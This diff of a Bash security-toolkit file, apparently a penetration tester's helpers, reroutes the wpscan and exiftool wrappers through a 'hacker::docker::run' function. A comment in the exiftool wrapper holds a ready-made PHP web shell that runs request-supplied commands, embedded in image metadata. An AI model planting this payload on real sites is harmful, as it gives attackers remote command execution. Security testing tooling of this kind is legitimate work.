@@ -17,7 +17,7 @@ function file::validate {
 }
 
 function wpscan {
-    docker run --rm -i wpscanteam/wpscan "${@}" --api-token "${WPVULNDB_API_TOKEN}"
+    hacker::docker::run -i wpscanteam/wpscan "${@}" --api-token "${WPVULNDB_API_TOKEN}"
 }
 
 function filereport {
@@ -46,7 +46,7 @@ function filerescan {
 
 function exiftool {
     # code php -DocumentName="<h1>SLOVACUS<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpg
-    docker run --rm -v "${PWD}":/root/pub v4tech/exiftool \
+    hacker::docker::run -v "${PWD}":/root/pub v4tech/exiftool \
            exiftool "${@}"
 }
 
